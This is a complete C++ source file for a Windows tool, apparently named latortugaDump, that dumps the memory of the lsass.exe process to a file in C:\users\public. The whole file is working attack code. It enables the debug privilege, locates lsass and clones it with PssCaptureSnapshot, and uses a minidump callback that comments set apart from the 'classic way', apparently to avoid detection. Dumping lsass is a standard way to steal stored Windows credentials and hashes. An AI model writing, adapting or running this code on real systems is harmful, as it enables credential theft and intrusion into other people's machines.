// latortugaDump.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <stdio.h>
#include <string>
#include <map>
#include <processsnapshot.h>
#include <intrin.h>
#include <Dbghelp.h>
#pragma comment(lib,"ntdll.lib")
#pragma comment(lib,"dbghelp.lib")
using std::map;
using std::string;


//zw query information
typedef unsigned long(__stdcall* pfnZwQueryInformationProcess)(IN  HANDLE, IN  unsigned int, OUT PVOID, IN  ULONG, OUT PULONG);

pfnZwQueryInformationProcess ZwQueryInfoProcess = (pfnZwQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwQueryInformationProcess");

// use ntQuerySystemInformation to get parent process info
typedef DWORD(WINAPI* PNTQUERYSYSYTEMINFORMATION)(DWORD info_class, void* out, DWORD size, DWORD* out_size);
PNTQUERYSYSYTEMINFORMATION pNtQuerySystemInformation = (PNTQUERYSYSYTEMINFORMATION)GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtQuerySystemInformation");

wchar_t parentImageName[MAX_PATH + 1];
string fullPath;

typedef struct _SYSTEM_PROCESS_INFO
{
    ULONG                   NextEntryOffset;
    ULONG                   NumberOfThreads;
    LARGE_INTEGER           Reserved[3];
    LARGE_INTEGER           CreateTime;
    LARGE_INTEGER           UserTime;
    LARGE_INTEGER           KernelTime;
    UNICODE_STRING          ImageName;
    ULONG                   BasePriority;
    HANDLE                  ProcessId;
    HANDLE                  InheritedFromProcessId;
}SYSTEM_PROCESS_INFO, * PSYSTEM_PROCESS_INFO;

int Error(const char* msg) {
    printf("%s (%u)\n", msg, GetLastError());
    return 1;
}


int EnableSeDebugPriv() {
    HANDLE token;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token) == FALSE)
        return Error("Failed to open process token");
    LUID Luid;
    if (LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &Luid) == FALSE)
        return Error("Failed to get SE Debug LUID");
    TOKEN_PRIVILEGES newTokenPriv;
    newTokenPriv.PrivilegeCount = 1;
    newTokenPriv.Privileges[0].Luid = Luid;
    newTokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (AdjustTokenPrivileges(token, FALSE, &newTokenPriv, sizeof(newTokenPriv), NULL, NULL) == 0 || GetLastError() == ERROR_NOT_ALL_ASSIGNED)
        return Error("Failed to change privs");
    return 0;
}


int GetLsassyPid() {
    size_t bufferSize = 102400;
    ULONG ulReturnLength;
    NTSTATUS status;
    map <int, wchar_t*> pidMap;
    int myPid = GetCurrentProcessId();
    int parentPid = -1;
    int parentPidImageSize;
    PVOID buffer = VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    PSYSTEM_PROCESS_INFO procInfo;
    procInfo = (PSYSTEM_PROCESS_INFO)buffer;
    status = pNtQuerySystemInformation(SystemProcessInformation, procInfo, 1024 * 1024, NULL);
    if (status != STATUS_SUCCESS)
        return Error("Failed to query proc list");
    // save into dictionary
    while (procInfo->NextEntryOffset) {
        printf(": Image Name: %ws :\n", procInfo->ImageName.Buffer);
        procInfo = (PSYSTEM_PROCESS_INFO)((LPBYTE)procInfo + procInfo->NextEntryOffset);
        pidMap[(int)procInfo->ProcessId] = procInfo->ImageName.Buffer;
        if (wcscmp(L"lsass.exe", procInfo->ImageName.Buffer) == 0){ //, procInfo->ImageName.Length);
        //if (procInfo->ImageName.Buffer == L"lsass.exe") {
            int lsassPid = (int)procInfo->ProcessId;
            printf(":: found lsass pid -> %d ::\n",lsassPid);
            VirtualFree(buffer, 0, MEM_RELEASE);
            return lsassPid;
        }
    }
    VirtualFree(buffer, 0, MEM_RELEASE);
    return 1;
}
BOOL CALLBACK ATPMiniDumpWriteCallBack(
    __in PVOID CallbackParam,
    __in const PMINIDUMP_CALLBACK_INPUT CallbackInput,
    __inout PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
){
    switch (CallbackInput->CallbackType) {
    case 16:
        CallbackOutput->Status = S_FALSE;
        break;
    }
    return TRUE;
}



int main()
{   
    if (EnableSeDebugPriv() != 0)
        return 1;
    int LsassPid;
    HANDLE hLsass;
    HANDLE hDmpFile;
    // get lsass pid
    LsassPid = GetLsassyPid();
    if (LsassPid == 1)
        return Error("Failed to get pid of lsass");
    // get handle to lsass
    //hLsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, LsassPid);
    hLsass = OpenProcess(PROCESS_CREATE_PROCESS | PROCESS_CREATE_THREAD | PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, LsassPid);
    if (hLsass == NULL)
        return Error("Failed to get handle to lsass");
    // get handle to dump file
    char dmpPath[] = "C:\\users\\public\\takeADump.DMP";
    hDmpFile = CreateFileA(dmpPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDmpFile == INVALID_HANDLE_VALUE)
        return Error("failed to get handle to dmp file");
    printf("::: Ready to attempt dump! :::\n");
    // below is classic way
    //if (MiniDumpWriteDump(hLsass, LsassPid, hDmpFile, MiniDumpWithFullMemory, NULL, NULL, NULL) == FALSE)
    //    return Error("Failed to dump lasss");
    // printf("::: Successfully dumped! ::::\n");
    // return success
   HPSS hSnapshot;
   PSS_CAPTURE_FLAGS snapFlags = PSS_CAPTURE_VA_CLONE 
        | PSS_CAPTURE_HANDLES 
        | PSS_CAPTURE_HANDLE_NAME_INFORMATION
        | PSS_CAPTURE_HANDLE_BASIC_INFORMATION 
        | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION 
        | PSS_CAPTURE_HANDLE_TRACE 
        | PSS_CAPTURE_THREADS 
        | PSS_CAPTURE_THREAD_CONTEXT 
        | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED 
        | PSS_CREATE_BREAKAWAY_OPTIONAL 
        | PSS_CREATE_BREAKAWAY 
        | PSS_CREATE_RELEASE_SECTION 
        | PSS_CREATE_USE_VM_ALLOCATIONS;
    DWORD hr = PssCaptureSnapshot(hLsass, snapFlags, CONTEXT_ALL, &hSnapshot);
    MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
    ZeroMemory(&CallbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
    CallbackInfo.CallbackRoutine = ATPMiniDumpWriteCallBack;
    CallbackInfo.CallbackParam = NULL;
    BOOL yes = MiniDumpWriteDump(hSnapshot, LsassPid, hDmpFile, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
    if (!yes)
        return Error("failed to dump lsass");
    printf(":::: Successfully dumped lsass ::::");
    return 0;
}
